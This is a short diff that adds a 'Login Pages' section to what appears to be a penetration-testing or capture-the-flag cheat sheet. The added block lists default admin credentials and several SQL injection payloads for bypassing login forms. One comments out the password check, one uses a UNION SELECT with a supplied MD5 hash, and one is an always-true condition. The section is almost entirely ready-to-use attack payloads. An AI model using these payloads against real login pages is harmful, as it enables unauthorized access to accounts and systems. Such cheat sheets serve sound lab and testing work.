@@ -176,6 +176,16 @@ ssh -i ssh_key user@192.168.x.x
 Make sure ssh_key is the private key -> public key can show username though
 ```
 
+### Login Pages
+```
+Usr: Admin, Pass: Admin
+OR SQL injection
+admin' -- -
+Bypass MD5 hash username:
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+Password bypass
+' or 1=1--+
+```
 
 
 
